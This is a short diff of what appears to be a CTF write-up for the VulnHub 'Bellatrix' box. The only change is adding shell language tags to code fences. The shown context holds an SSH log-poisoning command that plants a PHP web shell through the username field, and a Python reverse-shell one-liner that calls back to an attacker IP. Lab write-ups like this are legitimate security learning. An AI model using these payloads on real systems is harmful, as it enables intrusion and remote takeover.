@@ -42,7 +42,7 @@ Social-Media: Twitter --> @BertrandLorent9, Instagram --> @BertrandLorente9
 
 # SSH Log Posioning
 
-```
+```shell
 ┌─[root@redteam2020] ─ [Fri Dec 04 14:24:56] [~/ctfs/vulnhub/bellatrix]
 └──╼ # ssh '<?php echo shell_exec($_GET["j1v37u2k3y"]);?>'@192.168.9.128
 <?php echo shell_exec($_GET["j1v37u2k3y"]);?>@192.168.9.128's password: 
@@ -58,7 +58,7 @@ Social-Media: Twitter --> @BertrandLorent9, Instagram --> @BertrandLorente9
 
 ## Reverse Shell
 
-```
+```shell
  >>  22
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.9.129",1334));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' Copied to clipboard
 ┌─[root@redteam2020] ─ [Fri Dec 04 14:29:05] [~/ctfs/vulnhub/bellatrix]
